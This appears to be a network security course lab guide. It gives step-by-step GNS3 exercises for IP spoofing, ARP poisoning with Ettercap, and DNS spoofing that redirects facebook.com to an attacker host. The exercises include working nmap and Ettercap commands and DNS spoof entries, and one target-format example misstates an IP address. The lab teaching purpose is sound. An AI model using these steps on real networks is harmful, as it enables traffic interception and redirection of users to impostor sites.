# IP SPOOFING

**IP spoofing** is the creation of *Internet Protocol (IP)* packets which have a modified source address in order to either hide the identity of the sender, to impersonate another computer system, or both. It is a technique often used by bad actors to invoke **DDoS attacks** against a target device or the surrounding infrastructure.

Sending and receiving IP packets is a primary way in which networked computers and other devices communicate, and constitutes the basis of the modern internet. All IP packets contain a header which precedes the body of the packet and contains important routing information, including the source address. In a normal packet, the source IP address is the address of the sender of the packet. If the packet has been spoofed, the source address will be forged.

## IP Spoofing example
### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp        
* Connect to the **attacker machine**
* Execute `nmap` command in order to scan all the network 

        sudo nmap -sPn 10.0.0.0/24
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Execute the `ip_spoofer.py` script as superuser

        sudo python3 ip_spoofer.py <Victim_IP_ADDRESS>
* Connect again to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp
* The pair `<ip,mac>` related to the ip address of our **Victim** has been changed
* Connect to another **ubuntu host machine** (ubuntu-2, for example) and run the following command

        ping <Victim_IP_ADDRESS>
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests


# ARP Poisoning Attack using Ettercap

An **ARP spoofing**, also known as **ARP poisoning**, is a Man in the Middle _**(MitM)**_ attack that allows attackers to intercept communication between network devices.

## ARP Poisoning example with Ettercap
### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp        
* Connect to the **attacker machine**
* Install **ettercap**

        sudo apt update
        sudo apt install ettercap-text-only
* Edit the file `/etc/ettercap/etter.conf`

        sudo pico /etc/ettercap/etter.conf
* Uncomment the following line by removing the `#` at the beginning of the string

  * Before:

        #redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
  * After:

        redir_command_on = "iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport"
* Execute `ettercap` command in order to scan all the network 
  * `-T:` **select the text only GUI**

        sudo ettercap -T
  * Press `spacebar` to enable/disable packets view
  * Press `l` (lowercase `L`) to show information about discovered devices in the network
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Stop `ettercap` pressing `q` 
* Run (again) `ettercap` in order to start with the **MITM** attack based on ARP Poisoning
  * `-M:` perform a mitm attack. Requires an additional argument useful to specify the **attack type**
  * `<ATTACK_TYPE>:` **ARP**, DHCP, ICMP, etc (see `man ettercap`) 
  * `<VICTIM_TARGET>:` is in the form `MAC/IPs/IPv6/PORTs`. If you want you can omit any of its parts and this will represent an ANY in that part, e.g.,
    
    `/10.0.0.5//` means **ANY mac address**, **ONLY ip 10.0.0.1**, **ANY IPv6** and **ANY port**

        sudo ettercap -T -M <ATTACK_TYPE> <VICTIM_TARGET>

* Connect again to **R1** and check the current IP/MAC assignment using the followng command

        show ip arp
* The pair `<ip,mac>` related to the ip address of our **Victim** has been changed
* Connect to another **ubuntu host machine** (ubuntu-2, for example) and run the following command

        ping <Victim_IP_ADDRESS>
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests

# DNS SPOOFING

**DNS Spoofing**, also referred to as **DNS cache poisoning**, is a form of computer security hacking in which corrupt Domain Name System data is introduced into the DNS resolver's cache, causing the name server to return an incorrect result record, e.g. an IP address. This results in traffic being diverted to the attacker's computer (or any other computer).

## DNS Spoofing example with **Ettercap**

### Settings:
 * **Attacker:** debian machine
 * **Victim:** ubuntu-1 host machine
 * **Router:** cisco-7200 image (R1 machine)
 * **Switch:** cisco-3745 image (SW1 machine)
 * **Other actors:** ubuntu-2 host machine

### Steps:
* Run the GNS3 lab
* Connect to the **attacker machine**
* Install **ettercap**

        sudo apt update
        sudo apt install ettercap-text-only
* Edit the file `/etc/ettercap/etter.dns`

        sudo pico /etc/ettercap/etter.dns
* Add lines in order to declare yourself as DNS server

        <Website> <DNS_Query_Type> <Attacker_IP_Address>
* E.g., add the following lines at the end of the file

        facebook.com        A       10.0.0.2
        *.facebook.com      A       10.0.0.2
        www.facebook.com    PTR     10.0.0.2
* Note that, in our example we setup the following parameters
  * `Website:` is **facebook.com** OR ***.facebook.com** OR **www.facebook.com**
  * `DNS_Query_Type`: is **A** OR **PTR**
    * `A:` is the Address Mapping record **(A Record)** - also known as a **DNS host record**. It stores a hostname and its corresponding IPv4 address
    * `PTR:` is a DNS **P**oin**T**er **R**ecord (PTR). It provides the domain name associated with an IP address. A DNS PTR record is exactly the opposite of the **A** record, which provides the IP address associated with a domain name. **DNS PTR records are used in reverse DNS lookups** 
  * `Attacker_IP_Address:` is **10.0.0.2**
* Execute `ettercap` command in order to scan all the network 
  * `-T:` **select the text only GUI**

        sudo ettercap -T
  * Press `spacebar` to enable/disable packets view
  * Press `l` (lowercase `L`) to show information about discovered devices in the network
* Choose the IP and MAC address of the machine you want to attack (we will choose the ip addres of the **ubuntu-1 host** for simplicity)
* Stop `ettercap` pressing `q` 
* Run (again) `ettercap` in order to start with the **MITM** attack based on ARP
  * `-M:` perform a mitm attack. Requires an additional argument useful to specify the **attack type**
  * `<ATTACK_TYPE>:` **ARP**, DHCP, ICMP, etc (see `man ettercap`) 
  * `<VICTIM_TARGET>:` is in the form `MAC/IPs/IPv6/PORTs`. If you want you can omit any of its parts and this will represent an ANY in that part, e.g.,
    
    `/10.0.0.5//` means **ANY mac address**, **ONLY ip 10.0.0.1**, **ANY IPv6** and **ANY port**

        sudo ettercap -T -M <ATTACK_TYPE> <VICTIM_TARGET>
* Press `p` and enter `dns_spoof`
* Connect to the **Victim machine**  and run the following command

        ping facebook.com
* Execute **Wireshark** on the link which connects the **Victim** machine to the **Switch (SW1)**
    * Check if the **Victim** is receiving new **icmp** requests
* Execute **Wireshark** on the link which connects the **Attacker** machine to the **Switch (SW1)**
    * Check if the **Attacker** is receiving new **icmp** requests
